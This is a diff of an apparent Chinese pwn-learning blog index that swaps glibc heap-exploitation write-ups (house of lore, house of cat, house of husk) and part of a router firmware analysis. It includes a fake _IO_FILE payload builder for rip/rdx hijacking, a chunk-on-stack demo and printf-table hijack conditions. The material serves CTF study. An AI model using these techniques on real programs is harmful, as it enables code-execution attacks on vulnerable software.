-    <url>/2024/08/15/house%20of%20lore/</url>
-    <content><![CDATA[<h2 id="使用版本以及影响"><a href="#使用版本以及影响" class="headerlink" title="使用版本以及影响"></a>使用版本以及影响</h2><p>2.23-2.31(不包含2.31)</p>
-<p><strong>libc-2.23</strong></p>
-<p><strong>libc-2.27</strong></p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">if (__glibc_unlikely (bck-&gt;fd != victim))</span><br></pre></td></tr></tbody></table></figure>
+    <title>house-of-cat</title>
+    <url>/2024/08/14/house%20of%20cat/</url>
+    <content><![CDATA[<h1 id="适用版本"><a href="#适用版本" class="headerlink" title="适用版本:"></a>适用版本:</h1><h3 id="2-23-2-25"><a href="#2-23-2-25" class="headerlink" title="2.23-2.25"></a>2.23-2.25</h3><h1 id="使用条件"><a href="#使用条件" class="headerlink" title="使用条件"></a>使用条件</h1><p>–能<strong>任意写</strong>一个<strong>可控</strong>地址（如largebin attack）</p>
+<p>–能泄露 libc 地址和 heap 地址</p>
+<p>–能触发 <strong>IO 流</strong>（三种方式）</p>
+<p>​		1.调用exit或从main退出</p>
+<p>​		2. puts、printf函数调用</p>
+<p>​		3. _malloc_assert</p>
+<h1 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析:"></a>源码分析:</h1><p>关键点:</p>
+<p>两条io链条:</p>
+<p>**1.malloc_assert -&gt; fxprintf -&gt; vfxprintf-&gt;locked_vfxprintf -&gt; vfprintf_internal -&gt; IO-&gt;vtable-&gt;_IO_file_xsputn–&gt;IO_wfile_seekoff **</p>
+<p><strong>2.IO_wfile_seekoff -&gt; _IO_switch_to_wget_mode-&gt;IO_WOVERFLOW</strong></p>
+<p>攻击脚本如下：</p>
+<p>fake_io的伪造</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">fake_struct = p64(0) #_IO_read_end</span><br><span class="line">fake_struct += p64(0) #_IO_read_base</span><br><span class="line">fake_struct += p64(0) #_IO_write_base</span><br><span class="line">fake_struct += p64(0) #_IO_write_ptr</span><br><span class="line">fake_struct += p64(0) #_IO_write_end</span><br><span class="line">fake_struct += p64(0) #_IO_buf_base</span><br><span class="line">fake_struct += p64(1) #_IO_buf_end</span><br><span class="line">fake_struct += p64(0) #_IO_save_base</span><br><span class="line">fake_struct += p64(fake_io_addr + 0xb0) #_IO_backup_base = rdx</span><br><span class="line">fake_struct += p64(setcontext + 61) #_IO_save_end = call_addr</span><br><span class="line">fake_struct += p64(0)  #_markers</span><br><span class="line">fake_struct += p64(0)  #_chain</span><br><span class="line">fake_struct += p64(0)  #_fileno</span><br><span class="line">fake_struct += p64(0)  #_old_offset</span><br><span class="line">fake_struct += p64(0)  #_cur_column</span><br><span class="line">fake_struct += p64(heap_base + 0x200) #_lock = heap_addr or writeable libc_addr</span><br><span class="line">fake_struct += p64(0) #_offset</span><br><span class="line">fake_struct += p64(0) #_codecvx</span><br><span class="line">fake_struct += p64(fake_io_addr + 0x30) #_wfile_data rax1</span><br><span class="line">fake_struct += p64(0) #_freers_list</span><br><span class="line">fake_struct += p64(0) #_freers_buf</span><br><span class="line">fake_struct += p64(0) #__pad5</span><br><span class="line">fake_struct += p32(0) #_mode</span><br><span class="line">fake_struct += b"\x00"*20 #_unused2</span><br><span class="line">fake_struct += p64(_IO_wfile_jumps + 0x10) #vatable</span><br><span class="line">fake_struct += p64(0)*6 #padding</span><br><span class="line">fake_struct += p64(fake_io_addr + 0x40) #rax2 -&gt; to make [rax+0x18] = setcontext + 61</span><br></pre></td></tr></tbody></table></figure>
 
-<p>检查 fakechunk-&gt;FD 是不是 victim_chunk</p>
-<p><strong>libc-2.31</strong>（House Of Lore 被ban）</p>
-<h2 id="原理解析"><a href="#原理解析" class="headerlink" title="原理解析"></a>原理解析</h2><p>house of lore是通过small bin机制，去进行任意地址的chunk 分配</p>
-<h3 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h3><ul>
-<li>House of Lore 利用的前提是需要控制 Small Bin Chunk 的bk指针，并且控制指定位置 chunk 的fd指针</li>
-</ul>
-<h2 id="源码解析"><a href="#源码解析" class="headerlink" title="源码解析"></a>源码解析</h2><p>在_int_malloc libc2.23版本的3405的位置</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">if (in_smallbin_range (nb))</span><br><span class="line">   {</span><br><span class="line">     idx = smallbin_index (nb);</span><br><span class="line">     bin = bin_at (av, idx);</span><br><span class="line"></span><br><span class="line">     if ((victim = last (bin)) != bin)</span><br><span class="line">       {</span><br><span class="line">         if (victim == 0) /* initialization check */</span><br><span class="line">           malloc_consolidate (av);</span><br><span class="line">         else</span><br><span class="line">           {</span><br><span class="line">             bck = victim-&gt;bk;</span><br><span class="line">if (__glibc_unlikely (bck-&gt;fd != victim))</span><br><span class="line">               {</span><br><span class="line">                 errstr = "malloc(): smallbin double linked list corrupted";</span><br><span class="line">                 goto errout;</span><br><span class="line">               }</span><br><span class="line">             set_inuse_bit_at_offset (victim, nb);</span><br><span class="line">             bin-&gt;bk = bck;</span><br><span class="line">             bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">             if (av != &amp;main_arena)</span><br><span class="line">               victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class="line">             check_malloced_chunk (av, victim, nb);</span><br><span class="line">             void *p = chunk2mem (victim);</span><br><span class="line">             alloc_perturb (p, bytes);</span><br><span class="line">             return p;</span><br><span class="line">           }</span><br><span class="line">       }</span><br><span class="line">   }</span><br></pre></td></tr></tbody></table></figure>
+<p>接下来通过源码调试加io链条的路线去解析这个脚本的由来，以及整个路线的分析</p>
+<h2 id="注意事项！！！"><a href="#注意事项！！！" class="headerlink" title="注意事项！！！"></a>注意事项！！！</h2><p>写调试脚本的时候p stderr的值不是我们要的 我们要找的是存放它的值然后修改是p &amp;stderr，这里卡了我挺久的……..我是说怎么调试不对</p>
+<h2 id="第一条链"><a href="#第一条链" class="headerlink" title="第一条链"></a>第一条链</h2><h2 id="malloc-assert的触发"><a href="#malloc-assert的触发" class="headerlink" title="__malloc_assert的触发"></a>__malloc_assert的触发</h2><h3 id="该函数的内容"><a href="#该函数的内容" class="headerlink" title="该函数的内容"></a>该函数的内容</h3><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">static void</span><br><span class="line">__malloc_assert (const char *assertion, const char *file, unsigned int line,</span><br><span class="line">		 const char *function)</span><br><span class="line">{</span><br><span class="line">  (void) __fxprintf (NULL, "%s%s%s:%u: %s%sAssertion `%s' failed.\n",</span><br><span class="line">		     __progname, __progname[0] ? ": " : "",</span><br><span class="line">		     file, line,</span><br><span class="line">		     function ? function : "", function ? ": " : "",</span><br><span class="line">		     assertion);</span><br><span class="line">  fflush (stderr);</span><br><span class="line">  abort ();</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
 
-<h3 id="第一块碎片"><a href="#第一块碎片" class="headerlink" title="第一块碎片"></a>第一块碎片</h3><pre><code>  if ((victim = last (bin)) != bin)
-    {
-      if (victim == 0) /* initialization check */
-        malloc_consolidate (av);
-      else
-        {
-          bck = victim-&gt;bk;
-</code></pre>
-<p>如果victim不是small bin的最后一个也就是未满的情况</p>
-<p>bck=victim-&gt;bk           此时bk被我们伪造为target addr   所以bck=target addr</p>
-<h3 id="第二块碎片"><a href="#第二块碎片" class="headerlink" title="第二块碎片"></a>第二块碎片</h3><pre><code>          set_inuse_bit_at_offset (victim, nb);
-          bin-&gt;bk = bck;
-          bck-&gt;fd = bin;
-</code></pre>
-<p>bin-&gt;bk=bck,这就相当于把target addr  链入small bin的开头，接下来我们就可以通过malloc把这取出来</p>
-<h3 id="第三块碎片"><a href="#第三块碎片" class="headerlink" title="第三块碎片"></a>第三块碎片</h3><p>要执行这一步要经过这个check</p>
-<pre><code>if (__glibc_unlikely (bck-&gt;fd != victim))
-            {
-              errstr = "malloc(): smallbin double linked list corrupted";
-              goto errout;
-            }
-</code></pre>
-<p>也就是bck-&gt;fd=victim  也就是说  target_addr+0x10 的位置要等于victim的地址</p>
-<h2 id="接下来通过demo演示-实验环境2-23"><a href="#接下来通过demo演示-实验环境2-23" class="headerlink" title="接下来通过demo演示(实验环境2.23)"></a>接下来通过demo演示(实验环境2.23)</h2><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;stdint.h&gt;</span><br><span class="line">#include &lt;assert.h&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">int main(int argc, char * argv[]){</span><br><span class="line">    intptr_t* stack_buffer_1[4] = {0};</span><br><span class="line">    intptr_t* stack_buffer_2[4] = {0};</span><br><span class="line">    intptr_t *victim = malloc(0x100);</span><br><span class="line">    malloc(0x10);</span><br><span class="line">    free(victim);</span><br><span class="line">    malloc(0x400);</span><br><span class="line">    victim[1] = &amp;stack_buffer_1; // victim_chunk_addr-&gt;bk = stack_buffer_1_addr</span><br><span class="line">    stack_buffer_1[2] = victim-2; //stack_buffer_1-&gt;fd = victim_chunk_addr</span><br><span class="line">//===============================line=================================</span><br><span class="line">    intptr_t *p1 = malloc(0x100);</span><br><span class="line">    intptr_t *p2 = malloc(0x100);//chunk on the stack</span><br><span class="line">    malloc(0x100); //failed : bck-&gt;fd != victim</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+<p>这是__malloc_assert的内容，会执行入fxprintf 然后进入abort</p>
+<h3 id="该函数被调用的条件"><a href="#该函数被调用的条件" class="headerlink" title="该函数被调用的条件"></a>该函数被调用的条件</h3><p>_int_malloc—-&gt;sysmalloc—-&gt;__malloc_assert</p>
+<p>也就是说能走到sysmalloc就可以执行__malloc_assert</p>
+<p>是通过_int_malloc的部分进行的sysmalloc的调用，和调用有关的源码如下</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">if ((unsigned long) (size) &gt;= (unsigned long) (nb + MINSIZE)) {</span><br><span class="line">    // 当可用内存块大小大于等于请求大小和最小块大小之和时</span><br><span class="line">    remainder_size = size - nb; // 计算剩余大小</span><br><span class="line">    remainder = chunk_at_offset(victim, nb); // 获取剩余块</span><br><span class="line">    av-&gt;top = remainder; // 更新top块</span><br><span class="line">    set_head(victim, nb | PREV_INUSE | (av != &amp;main_arena ? NON_MAIN_ARENA : 0)); // 设置请求块头</span><br><span class="line">    set_head(remainder, remainder_size | PREV_INUSE); // 设置剩余块头</span><br><span class="line"></span><br><span class="line">    check_malloced_chunk(av, victim, nb); // 检查分配的块</span><br><span class="line">    void *p = chunk2mem(victim); // 获取用户指针</span><br><span class="line">    alloc_perturb(p, bytes); // 调用perturb函数</span><br><span class="line">    return p; // 返回用户指针</span><br><span class="line">} </span><br><span class="line">else if (atomic_load_relaxed(&amp;av-&gt;have_fastchunks)) {</span><br><span class="line">    // 如果有快速释放的块存在</span><br><span class="line">    malloc_consolidate(av); // 合并小块减少碎片</span><br><span class="line">    if (in_smallbin_range(nb)) // 恢复原始bin索引</span><br><span class="line">        idx = smallbin_index(nb);</span><br><span class="line">    else</span><br><span class="line">        idx = largebin_index(nb);</span><br><span class="line">} </span><br><span class="line">else {</span><br><span class="line">    void *p = sysmalloc(nb, av); // 调用系统内存分配</span><br><span class="line">    if (p != NULL)</span><br><span class="line">        alloc_perturb(p, bytes); // 调用perturb函数</span><br><span class="line">    return p; // 返回用户指针</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">// 结束函数</span><br></pre></td></tr></tbody></table></figure>
 
-<p><strong>堆块布局：</strong></p>
-<pre><code>intptr_t* stack_buffer_1[4] = {0};
-intptr_t* stack_buffer_2[4] = {0};
-intptr_t *victim = malloc(0x100);
-malloc(0x10);
-free(victim);
-malloc(0x400);
-</code></pre>
-<p><img src="/pic/house_of_lore/0.png" alt="img"></p>
-<p>此时的malloc(0x400)是为了将unsorted bin 变为small bin</p>
-<p><strong>布置攻击条件</strong></p>
-<pre><code>victim[1] = &amp;stack_buffer_1; // victim_chunk_addr-&gt;bk = stack_buffer_1_addr
-stack_buffer_1[2] = victim-2; //stack_buffer_1-&gt;fd = victim_chunk_addr
-</code></pre>
-<p><img src="/pic/house_of_lore/1.png" alt="img"></p>
-<h3 id="攻击效果"><a href="#攻击效果" class="headerlink" title="攻击效果"></a>攻击效果</h3><p><img src="/pic/house_of_lore/2.png" alt="img"></p>
-<p>接下来在申请一次就可以再目标地址布置堆</p>
-<p><img src="/pic/house_of_lore/3.png" alt="img"></p>
-<h2 id="2-27源码更改"><a href="#2-27源码更改" class="headerlink" title="2.27源码更改"></a>2.27源码更改</h2><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">  if (in_smallbin_range (nb))</span><br><span class="line">    {</span><br><span class="line">      idx = smallbin_index (nb);</span><br><span class="line">      bin = bin_at (av, idx);</span><br><span class="line"></span><br><span class="line">      if ((victim = last (bin)) != bin)</span><br><span class="line">        {</span><br><span class="line">          bck = victim-&gt;bk;</span><br><span class="line">	  if (__glibc_unlikely (bck-&gt;fd != victim))</span><br><span class="line">	    malloc_printerr ("malloc(): smallbin double linked list corrupted");</span><br><span class="line">          set_inuse_bit_at_offset (victim, nb);</span><br><span class="line">          bin-&gt;bk = bck;</span><br><span class="line">          bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">          if (av != &amp;main_arena)</span><br><span class="line">	    set_non_main_arena (victim);</span><br><span class="line">          check_malloced_chunk (av, victim, nb);</span><br><span class="line">#if USE_TCACHE</span><br><span class="line">	  /* While we're here, if we see other chunks of the same size,</span><br><span class="line">	     stash them in the tcache.  */</span><br><span class="line">	  size_t tc_idx = csize2tidx (nb);</span><br><span class="line">	  if (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">	    {</span><br><span class="line">	      mchunkptr tc_victim;</span><br><span class="line"></span><br><span class="line">	      /* While bin not empty and tcache not full, copy chunks over.  */</span><br><span class="line">	      while (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count</span><br><span class="line">		     &amp;&amp; (tc_victim = last (bin)) != bin)</span><br><span class="line">		{</span><br><span class="line">		  if (tc_victim != 0)</span><br><span class="line">		    {</span><br><span class="line">		      bck = tc_victim-&gt;bk;</span><br><span class="line">		      set_inuse_bit_at_offset (tc_victim, nb);</span><br><span class="line">		      if (av != &amp;main_arena)</span><br><span class="line">			set_non_main_arena (tc_victim);</span><br><span class="line">		      bin-&gt;bk = bck;</span><br><span class="line">		      bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">		      tcache_put (tc_victim, tc_idx);</span><br><span class="line">	            }</span><br><span class="line">		}</span><br><span class="line">	    }</span><br><span class="line">#endif</span><br><span class="line">          void *p = chunk2mem (victim);</span><br><span class="line">          alloc_perturb (p, bytes);</span><br><span class="line">          return p;</span><br><span class="line">        }</span><br><span class="line">    }</span><br></pre></td></tr></tbody></table></figure>
+<p>要到最后一个else才可以执行</p>
+<p>1.可用内存块大小大于小于请求大小和最小块大小之和时,也就是top chunk无法满足的时候可以触发</p>
+<p>sysmalloc关于__malloc_assert的调用代码:</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">assert ((old_top == initial_top (av) &amp;&amp; old_size == 0) ||</span><br><span class="line">         ((unsigned long) (old_size) &gt;= MINSIZE &amp;&amp;</span><br><span class="line">          prev_inuse (old_top) &amp;&amp;</span><br><span class="line">          ((unsigned long) old_end &amp; (pagesize - 1)) == 0));</span><br></pre></td></tr></tbody></table></figure>
 
-<p>要么使其满足 <code>tc_victim = last (bin)) == bin</code>、要么使其满足：<code>tcache-&gt;counts[tc_idx] ≥ mp_.tcache_count</code>。否则可能会因为非法内存访问使得程序 <code>down</code> 掉。</p>
-<p>高版本的情况2.31之后利用条件比较苛刻，有这利用条件 早就别的路去打io了</p>
-<p>参考文献</p>
-<p><a href="https://roderickchan.github.io/zh-cn/2023-02-27-house-of-all-about-glibc-heap-exploitation/">https://roderickchan.github.io/zh-cn/2023-02-27-house-of-all-about-glibc-heap-exploitation/</a></p>
-<p><a href="https://tty-flag.github.io/2021/04/20/House-of-lore.html">House of lore - TTY的博客 (tty-flag.github.io)</a></p>
-<p>[House Of Lore-原理 | Pwn进你的心 (ywhkkx.github.io)](<a href="https://ywhkkx.github.io/2022/03/10/House">https://ywhkkx.github.io/2022/03/10/House</a> Of Lore-原理/)</p>
+<p>在C语言中，<code>assert</code> 是一个宏，用于帮助在开发和调试过程中验证程序的假设。但当这些假设不成立时，<code>assert</code> 会引发程序崩溃或终止</p>
+<p>当 <code>assert</code> 条件为假时，<code>assert</code> 宏会打印错误信息并调用 <code>abort</code> 函数终止程序。</p>
+<p>检测条件</p>
+<ol>
+<li>old_size &gt;= 0x20;</li>
+<li>old_top.prev_inuse = 0;</li>
+<li>old_top页对齐</li>
+</ol>
+<p><img src="/pic/house_of_cat/1.png" alt="img"></p>
+<h2 id="fxprintf-vfxprintf"><a href="#fxprintf-vfxprintf" class="headerlink" title="fxprintf -> vfxprintf"></a>fxprintf -&gt; vfxprintf</h2><p>这里可以没有遇到困难可以直接到</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">int __vfxprintf (FILE *fp, const char *fmt, va_list ap,</span><br><span class="line">         unsigned int mode_flags)</span><br><span class="line">{</span><br><span class="line">  if (fp == NULL)</span><br><span class="line">    fp = stderr;</span><br><span class="line">  _IO_flockfile (fp);</span><br><span class="line">  int res = locked_vfxprintf (fp, fmt, ap, mode_flags);</span><br><span class="line">  _IO_funlockfile (fp);</span><br><span class="line">  return res;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+
+<h3 id="第一个阻碍点"><a href="#第一个阻碍点" class="headerlink" title="第一个阻碍点"></a>第一个阻碍点</h3><p>接着往下面走</p>
+<p><img src="/pic/house_of_cat/2.png" alt="img"></p>
+<p>在这里卡住了我们看一下源码</p>
+<p><img src="/pic/house_of_cat/3.png" alt="img"></p>
+<p>_IO_flockfile的源码</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line"># define _IO_flockfile(_fp) \</span><br><span class="line">  if (((_fp)-&gt;_flags &amp; _IO_USER_LOCK) == 0) _IO_lock_lock (*(_fp)-&gt;_lock)</span><br></pre></td></tr></tbody></table></figure>
+
+<p>_IO_lock_lock的源码</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">#define _IO_lock_lock(_name) \</span><br><span class="line">  do {                                \</span><br><span class="line">    void *__self = THREAD_SELF;                      \</span><br><span class="line">    if ((_name).owner != __self)                      \</span><br><span class="line">      {                               \</span><br><span class="line">    lll_lock ((_name).lock, LLL_PRIVATE);                 \</span><br><span class="line">        (_name).owner = __self;                      \</span><br><span class="line">      }                               \</span><br><span class="line">    ++(_name).cnt;                          \</span><br><span class="line">  } while (0)</span><br></pre></td></tr></tbody></table></figure>
+
+<p> 可以看到进了之后就是一个无限循环，死锁。所以我们要绕过这个，通过上面的代码可以得到条件</p>
+<p>1.fp–&gt;flag要是一个可读取的地址</p>
+<p><img src="/pic/house_of_cat/4.png" alt="img"></p>
+<p>然后就可以绕过这个检测</p>
+<h2 id="locked-vfxprintf-vfprintf-internal直接可以进"><a href="#locked-vfxprintf-vfprintf-internal直接可以进" class="headerlink" title="locked_vfxprintf -> vfprintf_internal直接可以进"></a>locked_vfxprintf -&gt; vfprintf_internal直接可以进</h2><h3 id="第二个障碍点"><a href="#第二个障碍点" class="headerlink" title="第二个障碍点"></a>第二个障碍点</h3><p>然后接着往下面走发现进不了vtable，通过源码调试发现</p>
+<p><img src="/pic/house_of_cat/5.png" alt="img"></p>
+<p><img src="/pic/house_of_cat/6.png" alt="img"></p>
+<p>不能进入_IO_vtable_check 进入就代表没过检测，这里检测vtable的位置于是出现了第二个障碍点</p>
+<p>1.通过修改fake_io的结构来给虚表的位置赋值为_IO_file_xsputn+0x10</p>
+<p><img src="/pic/house_of_cat/7.png" alt="img"></p>
+<p><img src="/pic/house_of_cat/8.png" alt="img"></p>
+<p><img src="/pic/house_of_cat/9.png" alt="img"></p>
+<h2 id="第二条链也是house-of-cat的关键"><a href="#第二条链也是house-of-cat的关键" class="headerlink" title="第二条链也是house of cat的关键"></a>第二条链也是house of cat的关键</h2><h3 id="第三个障碍"><a href="#第三个障碍" class="headerlink" title="第三个障碍"></a>第三个障碍</h3><p><img src="/pic/house_of_cat/10.png" alt="img"></p>
+<p><img src="/pic/house_of_cat/11.png" alt="img"></p>
+<p>1.这个地方需要fp–&gt;wide_data要有值</p>
+<p>2.这个值指向的两个位置一个是IO_write_ptr一个是IO_write_base,前者要比后者小才对**，不然就无法使was_writting为true</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">bool was_writing = ((fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">              &gt; fp-&gt;_wide_data-&gt;_IO_write_base)</span><br><span class="line">             || _IO_in_put_mode (fp));</span><br></pre></td></tr></tbody></table></figure>
+
+<p>然后就进入_IO_switch_to_wget_mode</p>
+<h2 id="劫持rip流"><a href="#劫持rip流" class="headerlink" title="劫持rip流"></a>劫持rip流</h2><p><img src="/pic/house_of_cat/12.png" alt="img"></p>
+<p>通过rax–&gt;[rax+0xe0]–&gt; 到call  [rax+0xe0]+0x18 来劫持rip</p>
+<p>还可以劫持rdx</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">0x7ffff7e07cbf &lt;_IO_switch_to_wget_mode+15&gt;    mov    rdx, qword ptr [rax + 0x20]     RDX, [0x5555555592b0] =&gt; 2</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="/pic/house_of_cat/13.png" alt="img"></p>
+<p>成功劫持，至此house of cat的过程结束</p>
 ]]></content>
       <categories>
         <category>pwn学习</category>
@@ -161,90 +307,102 @@ stack_buffer_1[2] = victim-2; //stack_buffer_1-&gt;fd = victim_chunk_addr
       </tags>
   </entry>
   <entry>
-    <title>TOTOLINK_NR1800X Multi-vulnerability analysis</title>
-    <url>/2024/08/17/TOTOLINK_NR1800X%20Multi-vulnerability%20analysis/</url>
-    <content><![CDATA[<h2 id="固件提取："><a href="#固件提取：" class="headerlink" title="固件提取："></a>固件提取：</h2><figure class="highlight ruby"><table><tbody><tr><td class="code"><pre><span class="line"><span class="symbol">https:</span>/<span class="regexp">/www.totolink.net/home</span><span class="regexp">/menu/detail</span><span class="regexp">/menu_listtpl/download</span><span class="regexp">/id/</span><span class="number">225</span>/ids/<span class="number">36</span>.html</span><br></pre></td></tr></tbody></table></figure>
+    <title>house-of-husk</title>
+    <url>/2024/09/01/house%20of%20husk/</url>
+    <content><![CDATA[<h2 id="适用版本"><a href="#适用版本" class="headerlink" title="适用版本"></a>适用版本</h2><p>glibc 2.23–2.35版本中，该手法均可用</p>
+<h2 id="使用条件："><a href="#使用条件：" class="headerlink" title="使用条件："></a>使用条件：</h2><ol>
+<li>能向 <code>__printf_function_table</code> 中写入任意数据，使其不为空</li>
+<li>能向 <code>__printf_arginfo_table</code> 中写入一个可控地址</li>
+<li>通过条件 <code>2</code> ,让 <code>__printf_arginfo_table[spec]</code> 为 <code>backdoor</code> 或者 ogg 地址</li>
+</ol>
+<h2 id="漏洞原理解析"><a href="#漏洞原理解析" class="headerlink" title="漏洞原理解析"></a>漏洞原理解析</h2><p>链条为下面四个部分，简单来说就是通过劫持printf自定义的格式化字符串执行ogg或者后门函数(这里的自定义格式化指的是通过任意地址写修改来导致满足条件)</p>
+<ol>
+<li>printf-&gt;vfprintf</li>
+<li>vfprintf-&gt;do_positional</li>
+<li>do_positional-&gt;printf_positional</li>
+<li>printf_positional-&gt;__parse_one_specmb</li>
+</ol>
+<h3 id="1-printf-vfprintf"><a href="#1-printf-vfprintf" class="headerlink" title="1.printf->vfprintf"></a>1.printf-&gt;vfprintf</h3><p>这一段看printf函数定义 不是很重要:</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">int</span><br><span class="line">__printf (const char *format, ...)</span><br><span class="line">{</span><br><span class="line">  va_list arg;</span><br><span class="line">  int done;</span><br><span class="line"></span><br><span class="line">  va_start (arg, format);</span><br><span class="line">  done = vfprintf (stdout, format, arg);</span><br><span class="line">  va_end (arg);</span><br><span class="line"></span><br><span class="line">  return done;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
 
-<p><img src="/pic/TOTOLINK_NR1800X/0.png" alt="img"></p>
-<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>首先收集信息发现程序是通过lighttpd启动的，架构是小端序的mips架构</p>
-<p>因为程序的特殊性，本次复现会通过用户态和系统态两个状态进行复现</p>
-<p><strong>用户态</strong></p>
-<p>启动</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">sudo chroot . ./qemu-mipsel-static ./usr/sbin/lighttpd</span><br></pre></td></tr></tbody></table></figure>
+<h3 id="2-vfprintf-do-positional"><a href="#2-vfprintf-do-positional" class="headerlink" title="2.vfprintf->do_positional"></a>2.vfprintf-&gt;do_positional</h3><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">/* Use the slow path in case any printf handler is registered.  */</span><br><span class="line">if (__glibc_unlikely (__printf_function_table != NULL</span><br><span class="line">	|| __printf_modifier_table != NULL</span><br><span class="line">	|| __printf_va_arg_table != NULL))</span><br><span class="line">  goto do_positional;</span><br></pre></td></tr></tbody></table></figure>
 
-<p><img src="/pic/TOTOLINK_NR1800X/1.png" alt="img"></p>
-<p>这里报了错 要指定配置文件</p>
-<p><img src="/pic/TOTOLINK_NR1800X/2.png" alt="img"></p>
-<p>这里说没有/var/run/lighttpd.pid文件 我们创造一个就好</p>
-<p><img src="/pic/TOTOLINK_NR1800X/3.png" alt="img"></p>
-<p><img src="/pic/TOTOLINK_NR1800X/4.png" alt="img"></p>
-<p>可以看到程序确实是启动了 但是根本就没有回显，这就是用户态造成的问题了，接下来我们用系统态复现</p>
-<p><strong>系统态</strong></p>
-<p>用户态访问是白板，很显然是哪里出了问题，很大可能是配置文件没有加载全，这种情况就转化为系统态</p>
-<p>QEMU启动虚拟机所需要的镜像</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">wget https://people.debian.org/~aurel32/qemu/mipsel/debian_squeeze_mipsel_standard.qcow2</span><br><span class="line">wget https://people.debian.org/~aurel32/qemu/mipsel/vmlinux-3.2.0-4-4kc-malta</span><br></pre></td></tr></tbody></table></figure>
+<p>这里的关键点在于这个能否成功进入do_positional函数 这里要满足这printf_va_arg_table, printf_function_table,__printf_modifier_table的其中一个不为null或0就好，这里我们通常是通过改printf_va_arg_table</p>
+<h3 id="3-do-positional-printf-positional"><a href="#3-do-positional-printf-positional" class="headerlink" title="3.do_positional->printf_positional"></a>3.do_positional-&gt;printf_positional</h3><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line"> if (__glibc_unlikely (__printf_function_table != NULL</span><br><span class="line">			|| __printf_modifier_table != NULL</span><br><span class="line">			|| __printf_va_arg_table != NULL))</span><br><span class="line">    goto do_positional;</span><br><span class="line"></span><br><span class="line">......</span><br><span class="line"></span><br><span class="line">do_positional:</span><br><span class="line">  if (__glibc_unlikely (workstart != NULL))</span><br><span class="line">    {</span><br><span class="line">      free (workstart);</span><br><span class="line">      workstart = NULL;</span><br><span class="line">    }</span><br><span class="line">  done = printf_positional (s, format, readonly_format, ap, &amp;ap_save,</span><br><span class="line">			    done, nspecs_done, lead_str_end, work_buffer,</span><br><span class="line">			    save_errno, grouping, thousands_sep);</span><br></pre></td></tr></tbody></table></figure>
 
-<p>配置本地</p>
-<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">sudo brctl addbr virbr0</span><br><span class="line">sudo ifconfig virbr0 192.168.2.1/24 up</span><br><span class="line">sudo tunctl -t tap0</span><br><span class="line">sudo ifconfig tap0 192.168.2.11/24 up</span><br><span class="line">sudo brctl addif virbr0 tap0</span><br></pre></td></tr></tbody></table></figure>
+<p>这里调用了printf_positional函数</p>
+<h3 id="4-printf-positional-parse-one-specmb"><a href="#4-printf-positional-parse-one-specmb" class="headerlink" title="4.printf_positional->__parse_one_specmb"></a>4.printf_positional-&gt;__parse_one_specmb</h3><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">printf_positional (_IO_FILE *s, const CHAR_T *format, int readonly_format,</span><br><span class="line">		   va_list ap, va_list *ap_savep, int done, int nspecs_done,</span><br><span class="line">		   const UCHAR_T *lead_str_end,</span><br><span class="line">		   CHAR_T *work_buffer, int save_errno,</span><br><span class="line">		   const char *grouping, THOUSANDS_SEP_T thousands_sep)</span><br><span class="line">{</span><br><span class="line">---------------------------------------</span><br><span class="line"></span><br><span class="line">      /* Parse the format specifier.  */</span><br><span class="line">#ifdef COMPILE_WPRINTF</span><br><span class="line">      nargs += __parse_one_specwc (f, nargs, &amp;specs[nspecs], &amp;max_ref_arg);</span><br><span class="line">#else</span><br><span class="line">      nargs += __parse_one_specmb (f, nargs, &amp;specs[nspecs], &amp;max_ref_arg);</span><br><span class="line">#endif</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">  /* Determine the number of arguments the format string consumes.  */</span><br><span class="line">  nargs = MAX (nargs, max_ref_arg);</span><br></pre></td></tr></tbody></table></figure>
 
-<p>启动之后配置如下图</p>
-<p><img src="/pic/TOTOLINK_NR1800X/5.png" alt="img"></p>
